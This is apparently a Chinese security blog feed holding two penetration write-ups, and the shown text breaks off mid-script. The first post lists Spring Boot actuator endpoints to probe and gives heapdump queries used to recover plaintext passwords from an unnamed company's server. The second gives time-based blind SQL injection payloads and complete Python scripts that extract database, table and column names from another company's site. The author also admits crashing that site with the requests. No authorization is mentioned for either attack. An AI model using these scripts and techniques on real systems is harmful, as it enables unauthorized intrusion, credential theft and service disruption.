    <url>/2021/08/23/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="记一次渗透一波三折找到的springboot利用"><a class="markdownIt-Anchor" href="#记一次渗透一波三折找到的springboot利用"></a> 记一次渗透一波三折找到的springboot利用</h1><h3 id="0x01-前言"><a class="markdownIt-Anchor" href="#0x01-前言"></a> 0x01 前言</h3><p>​在渗透某企业的时候（好久之前的了，写个总结），拐了七八个弯，终于在这个企业的某c段找到了个springboot未授权访问，真是拐了七八个弯，先从某管理系统入手，扫目录，弱密码，注入，还发现了fck文件编辑器，但是都没有用，最后还是突然发现该企业真实ip的特点-&gt;除了cdn的ip大多数都在一个ipc段，然后在某个ip找到了springboot的页面</p><h3 id="0x01-springboot利用"><a class="markdownIt-Anchor" href="#0x01-springboot利用"></a> 0x01 springboot利用</h3><p>​首先得找到springboot的whitepage页，还有个特点是有一个小绿叶的图标，存在这个可能还有Swagger UI，这个后面会说到。</p><p><img src="/2021/08/23/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20210915221517932.png" alt="image-20210915221517932"></p><p><img src="/2021/08/23/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20210915222544193.png" alt="image-20210915222544193"></p><p>​然后就是springboot的常用的接口泄露路径，参考<a href="https://github.com/LandGrey/SpringBootVulExploit#0x01%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F">LandGrey/SpringBootVulExploit: SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list (github.com)</a></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/actuator</span><br><span class="hljs-string">/auditevents</span><br><span class="hljs-string">/autoconfig</span><br><span class="hljs-string">/beans</span><br><span class="hljs-string">/caches</span><br><span class="hljs-string">/conditions</span><br><span class="hljs-string">/configprops</span><br><span class="hljs-string">/docs</span><br><span class="hljs-string">/dump</span><br><span class="hljs-string">/env</span><br><span class="hljs-string">/flyway</span><br><span class="hljs-string">/health</span><br><span class="hljs-string">/heapdump</span><br><span class="hljs-string">/httptrace</span><br><span class="hljs-string">/info</span><br><span class="hljs-string">/intergrationgraph</span><br><span class="hljs-string">/jolokia</span><br><span class="hljs-string">/logfile</span><br><span class="hljs-string">/loggers</span><br><span class="hljs-string">/liquibase</span><br><span class="hljs-string">/metrics</span><br><span class="hljs-string">/mappings</span><br><span class="hljs-string">/prometheus</span><br><span class="hljs-string">/refresh</span><br><span class="hljs-string">/scheduledtasks</span><br><span class="hljs-string">/sessions</span><br><span class="hljs-string">/shutdown</span><br><span class="hljs-string">/trace</span><br><span class="hljs-string">/threaddump</span><br><span class="hljs-string">/actuator/auditevents</span><br><span class="hljs-string">/actuator/beans</span><br><span class="hljs-string">/actuator/health</span><br><span class="hljs-string">/actuator/conditions</span><br><span class="hljs-string">/actuator/configprops</span><br><span class="hljs-string">/actuator/env</span><br><span class="hljs-string">/actuator/info</span><br><span class="hljs-string">/actuator/loggers</span><br><span class="hljs-string">/actuator/heapdump</span><br><span class="hljs-string">/actuator/threaddump</span><br><span class="hljs-string">/actuator/metrics</span><br><span class="hljs-string">/actuator/scheduledtasks</span><br><span class="hljs-string">/actuator/httptrace</span><br><span class="hljs-string">/actuator/mappings</span><br><span class="hljs-string">/actuator/jolokia</span><br><span class="hljs-string">/actuator/hystrix.stream</span><br><br></code></pre></td></tr></table></figure><h3 id="0x02-实战"><a class="markdownIt-Anchor" href="#0x02-实战"></a> 0x02 实战</h3><p>​于是我直接扫描了以上目录，发现接口暴露的还挺多，就有上面所说的swigger ui</p><p><img src="/2021/08/23/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20210915223723575.png" alt="image-20210915223723575"></p><p>swiggerui的界面如下，这上面都是一些api接口，利用这些接口<strong>可以尝试查看敏感信息，注入，文件上传等操作（不过我找到的这个站的swiggerui都是些查询信息的接口，只给测试数据，不知道具体参数也无法获得敏感信息）</strong></p><p><img src="/2021/08/23/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20210915224128906.png" alt="image-20210915224128906"></p><p>​这些接口的利用方式如<a href="https://github.com/LandGrey/SpringBootVulExploit#0x01%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F">LandGrey/SpringBootVulExploit: SpringBoot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list (github.com)</a></p><p>这里根据这个站，我也尝试了很多方式，总结一下利用的重要接口</p><p><strong>1./env<code>、</code>/actuator/env</strong></p><p>正常访问（get）会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文（不过我遇到的这个站就是***号显示密码）</p><p><strong>2.能POST请求/env</strong>，即可在/env中添加属性</p><p><strong>3.能POST请求/refresh<code>、</code>/actuator/refresh刷新属性</strong>，很多RCE漏洞都得靠这个，目的是为了刷新/env的配置。</p><p>以上这几个是很多漏洞的基本要求，做不到可能就只能看看信息泄露，和**/trace**的信息利用了，很遗憾，我这个站这些操作都进行不了，如下访问/refresh提示404</p><p><img src="/2021/08/23/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20210915225502251.png" alt="image-20210915225502251"></p><h3 id="0x03-实战利用"><a class="markdownIt-Anchor" href="#0x03-实战利用"></a> 0x03 实战利用</h3><p>​既然不存在RCE漏洞利用的可能，就只能转向信息泄露了，我这个站访问/heapdump，发现可以下载到内存文件</p><p><img src="/2021/08/23/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20210915225745297.png" alt="image-20210915225745297"></p><p>根据github上的教程，使用Eclipse Memory Analyzer（java的内存分析工具）进行分析内存，方法：先打开要分析的文件，然后点击OQL按钮，输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">select * from org.springframework.web.context.support.StandardServletEnvironment<br>或者select * from java.util.Hashtable<span class="hljs-variable">$Entry</span> x WHERE (toString(x.key).contains(<span class="hljs-string">&quot;password&quot;</span>))<br></code></pre></td></tr></table></figure><p><img src="/2021/08/23/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20210915230313469.png" alt="image-20210915230313469"></p><p>点击红色感叹号，然后查看查询出来的键值就是./env中的带***的密码了</p><p><img src="/2021/08/23/%E8%AE%B0%E4%B8%80%E6%AC%A1springboot%E6%A1%86%E6%9E%B6%E7%9A%84%E5%88%A9%E7%94%A8/image-20210915230726784.png" alt="image-20210915230726784"></p><p>这波成功get到一堆重要密码，点到为止</p>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次渗透某企业遇到的sql延时盲注启发</title>
    <link href="/2021/08/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%E9%81%87%E5%88%B0%E7%9A%84sql%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%90%AF%E5%8F%91/"/>
    <url>/2021/08/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%E9%81%87%E5%88%B0%E7%9A%84sql%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%90%AF%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h1 id="记一次渗透某企业遇到的sql延时盲注启发"><a class="markdownIt-Anchor" href="#记一次渗透某企业遇到的sql延时盲注启发"></a> 记一次渗透某企业遇到的sql延时盲注启发</h1><p>​<strong>主要是记录一下自己写的脚本2333，只能说sqlmap真不是万能的2333.</strong></p><h2 id="0x01-注入"><a class="markdownIt-Anchor" href="#0x01-注入"></a> 0x01 注入</h2><p>​首先，某站用awvs扫出来个延时注入，payload是if(now()=sysdate(),sleep(15),0)，我一看这不mysql延时注入吗，直接sqlmap跑不就完事了，然而事情好像没这么简单，即使我指定了数据库是mysql，方式是延时盲注，mysql也跑不出来，我tm直接疑惑，随后bp抓包试了试。</p><p><img src="/2021/08/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%E9%81%87%E5%88%B0%E7%9A%84sql%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%90%AF%E5%8F%91/image-20210909112210988.png" alt="image-20210909112210988"></p><h2 id="0x02-bp测试"><a class="markdownIt-Anchor" href="#0x02-bp测试"></a> 0x02 bp测试</h2><p>​用bp抓包测试了下，延时是sleep()里的2倍，和payload显示是正确的，我寻思这这也没问题了，sqlmap怎么跑不了？</p><p><img src="/2021/08/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%E9%81%87%E5%88%B0%E7%9A%84sql%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%90%AF%E5%8F%91/image-20210909113259509.png" alt="image-20210909113259509"></p><p>​于是我用经典查询数据库的语句if(ascii(substr(database(),1,1))&gt;57,sleep(4),0)，设置sleep为4，一看不得了，这延时怎么翻了10倍，又想起了刚刚sqlmap跑的时候貌似提示延时那部分没收到返回包。</p><p><img src="/2021/08/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%E9%81%87%E5%88%B0%E7%9A%84sql%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%90%AF%E5%8F%91/image-20210909114002169.png" alt="image-20210909114002169"></p><p>​我觉得可能是这延时多了10倍，所以sqlmap才判断不出来，然后接着测试，有趣的一幕发生了，我连续发送多个包去测试，结果那网站崩了</p><p><img src="/2021/08/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%E9%81%87%E5%88%B0%E7%9A%84sql%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%90%AF%E5%8F%91/image-20210909142027847.png" alt="image-20210909142027847"></p><p>​可能设置延时太大，发多了就造成dos了2333，没办法只能等下午测试。</p><h2 id="0x03-py脚本"><a class="markdownIt-Anchor" href="#0x03-py脚本"></a> 0x03 py脚本</h2><p>​随后测试了一下，如果把sleep()设置成0.2的话，延时也会缩小1/10，曲线救国，又可以继续测试了.</p><p><img src="/2021/08/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%E9%81%87%E5%88%B0%E7%9A%84sql%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%90%AF%E5%8F%91/image-20210909142740509.png" alt="image-20210909142740509"></p><p>​不过sqlmap没得跑的话（也许可能是我不会操作？），只能自己写脚本上了，去网上搞了个post延时注入的脚本，自己改了改，挂vps跑，一气呵成，下面是跑数据库名的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#时间盲注post脚本</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning,InsecurePlatformWarning<br>requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)<br>value =<span class="hljs-string">&quot;0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&amp;^@_.-!&quot;</span><br>result=<span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">database_len</span>():</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">20</span>):<span class="hljs-comment">#测试数据库长度，自己设置范围</span><br>        url = <span class="hljs-string">&quot;***&quot;</span><br>        data_payload=<span class="hljs-string">&quot;database()&quot;</span><br>        payload = <span class="hljs-string">&quot;if(length(&#123;0&#125;)=&#123;1&#125;,sleep(0.1),0)&quot;</span>.<span class="hljs-built_in">format</span>(data_payload, n) <span class="hljs-comment">#payload</span><br>        <span class="hljs-built_in">print</span> (<span class="hljs-built_in">str</span>(payload))<br>        data = &#123;<span class="hljs-string">&quot;***&quot;</span>: payload&#125;<br>        start_time = time.time()<br>        html = requests.post(url=url, data=data,verify=<span class="hljs-literal">False</span>) <span class="hljs-comment">#免除ssl验证</span><br>        end_time = time.time()<br>        use_time = end_time - start_time <span class="hljs-comment">#求出请求前后的时间差来判断是否延时了</span><br>        <span class="hljs-built_in">print</span> (<span class="hljs-built_in">str</span>(use_time))<br>        <span class="hljs-keyword">if</span> use_time &gt; <span class="hljs-number">1.5</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;......数据库长度为:&quot;</span>+ <span class="hljs-built_in">str</span>(n))<br>            <span class="hljs-comment">#print(&quot;延时为&quot;+(str(use_time)))</span><br>            <span class="hljs-keyword">return</span> n<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data</span>(<span class="hljs-params">length</span>):</span><br>    <span class="hljs-keyword">global</span> result<br>    url = <span class="hljs-string">&quot;***&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> value:<br>            data_payload=<span class="hljs-string">&quot;database()&quot;</span><br>            payload = <span class="hljs-string">&quot;if(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(0.1),0)&quot;</span>.<span class="hljs-built_in">format</span>(data_payload,n,<span class="hljs-built_in">ord</span>(v))<br>            <span class="hljs-built_in">print</span> (<span class="hljs-built_in">str</span>(payload))<br>            data = &#123;<span class="hljs-string">&quot;***&quot;</span>: payload&#125;<br>            start_time = time.time()<br>            html = requests.post(url=url, data=data,verify=<span class="hljs-literal">False</span>)<br>            end_time = time.time()<br>            use_time = end_time - start_time<br>            <span class="hljs-keyword">if</span> use_time &gt;<span class="hljs-number">1.5</span>:<br>                result += v<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库名：&quot;</span>+result)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> result<br><br><br>url = <span class="hljs-string">&quot;***&quot;</span><br><span class="hljs-built_in">len</span>=database_len()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>f.write(<span class="hljs-string">&quot;数据库长度：&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>))<br>f.close()<br>database_name=get_data(<span class="hljs-built_in">len</span>+<span class="hljs-number">1</span>)<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>f.write(<span class="hljs-string">&quot;数据库名字：&quot;</span>+<span class="hljs-built_in">str</span>(database_name))<br>f.close()<br></code></pre></td></tr></table></figure><p><img src="/2021/08/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%E9%81%87%E5%88%B0%E7%9A%84sql%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%90%AF%E5%8F%91/image-20210909143527323.png" alt="image-20210909143527323"></p><p>​还学到个后台脚本挂vps的技巧，xxx.out是把输出重定向的文件，可以记录输出日志，也可以不用这个</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nohup</span> python<span class="hljs-number">3</span> -u xxx.py &gt; xxx.out <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &amp;<br></code></pre></td></tr></table></figure><p>​不过注出数据库名字后又遇到了个问题，注表名时如果用</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;数据库名&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">117</span><br></code></pre></td></tr></table></figure><p>这个payload，会直接返回404</p><p><img src="/2021/08/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%E9%81%87%E5%88%B0%E7%9A%84sql%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%90%AF%E5%8F%91/image-20210909150535737.png" alt="image-20210909150535737"></p><p>​把数据库名换成database()，试试了下，居然成功了，说明可能是引号有问题，不知道问题出在那里。</p><p><img src="/2021/08/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%E9%81%87%E5%88%B0%E7%9A%84sql%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%90%AF%E5%8F%91/image-20210909150940447.png" alt="image-20210909150940447"></p><p>​于是写了爆破表名的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning,InsecurePlatformWarning<br>requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)<br>value =<span class="hljs-string">&quot;0123456789abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&amp;^@_.-!&quot;</span><br>result=<span class="hljs-string">&quot;&quot;</span><br><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data</span>(<span class="hljs-params">length,table_num</span>):</span><br>    <span class="hljs-keyword">global</span> result<br>    url = <span class="hljs-string">&quot;***&quot;</span><br>    table_name_new=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,length):<br>        <br>        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> value:<br>            data_payload=<span class="hljs-string">&quot;(select table_name from information_schema.tables where table_schema=database() limit &#123;0&#125;,1)&quot;</span>.<span class="hljs-built_in">format</span>(table_num)<br>            <span class="hljs-comment">#payload = &quot;if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;117,sleep(0.1),0)&quot;.format(data_payload,n,ord(v))</span><br>            payload = <span class="hljs-string">&quot;if(ascii(substr(&#123;0&#125;,&#123;1&#125;,1))=&#123;2&#125;,sleep(0.1),0)&quot;</span>.<span class="hljs-built_in">format</span>(data_payload,n,<span class="hljs-built_in">ord</span>(v))<br>            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;test:&quot;</span>+<span class="hljs-built_in">str</span>(payload))<br>            data = &#123;<span class="hljs-string">&quot;**&quot;</span>: payload&#125;<br>            start_time = time.time()<br>            html = requests.post(url=url, data=data,verify=<span class="hljs-literal">False</span>)<br>            end_time = time.time()<br>            use_time = end_time - start_time<br>            <span class="hljs-keyword">if</span> use_time &gt;<span class="hljs-number">1.5</span>:<br>                table_name_new += v<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第 &quot;</span>+<span class="hljs-built_in">str</span>(table_num)+<span class="hljs-string">&quot; 个表名:&quot;</span>+table_name_new)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> table_name_new<br><br><br>url = <span class="hljs-string">&quot;***&quot;</span><br><br><span class="hljs-keyword">for</span> table_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">30</span>):<br>    tablet_name=get_data(<span class="hljs-number">20</span>,table_num)<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result_table.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    f.write(<span class="hljs-string">&quot;第 &quot;</span>+<span class="hljs-built_in">str</span>(table_num)+<span class="hljs-string">&quot; 个表名:&quot;</span>+<span class="hljs-built_in">str</span>(tablet_name)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.close()<br><br><br><br></code></pre></td></tr></table></figure><p>​挂vps上跑美滋滋</p><p><img src="/2021/08/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%E9%81%87%E5%88%B0%E7%9A%84sql%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%90%AF%E5%8F%91/image-20210909155622285.png" alt="image-20210909155622285"></p><h2 id="0x04-套娃盲注爆列"><a class="markdownIt-Anchor" href="#0x04-套娃盲注爆列"></a> 0x04 套娃盲注爆列</h2><p>​到了爆列的时候又出现了刚刚那个问题，就是如果知道表名的话使用</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=‘表名’ <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">105</span><br></code></pre></td></tr></table></figure><p>这个payload的话，也会像刚刚那样返回404，果然还是引号的问题，去网上看了看其他的payload，于是又看了看mysql 8.0的新注入payload，都不行，因为里面都有引号，于是又试下url编码，还是不行，这时我突然想到一个办法，如果拿表名用</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>(代表查询数据库的第一个表)这个语句代替呢？没想到还居然成功了，这操作我在网上都没看到过2333，我直呼套娃？！</p><p><img src="/2021/08/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%9F%90%E4%BC%81%E4%B8%9A%E9%81%87%E5%88%B0%E7%9A%84sql%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E5%90%AF%E5%8F%91/image-20210909161107138.png" alt="image-20210909161107138"></p><p>然后爆列的payload就是:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">if</span>(ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)  <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">105</span>,sleep(<span class="hljs-number">2</span>),<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>以此写了个py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 